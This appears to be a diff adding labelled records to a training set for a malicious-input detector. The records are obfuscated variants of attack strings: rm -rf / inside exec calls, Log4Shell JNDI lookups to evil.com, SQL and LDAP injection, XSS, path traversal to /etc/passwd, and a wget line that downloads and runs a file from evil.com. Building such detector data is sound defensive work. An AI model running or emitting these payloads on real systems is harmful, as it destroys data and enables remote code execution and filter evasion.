+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION SеLECT null, null, null FROM information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION SELECT null, null, null FROM information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm    -rf    /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "jAvA.lang.Runtime.getRuntime().exec('rm  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jаva.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('malicious    code')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "eval('malicious    code')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wgеt    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "java.lang.Runtimе.getRuntime().exec('rm​\\x20-rf\\x20/')", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
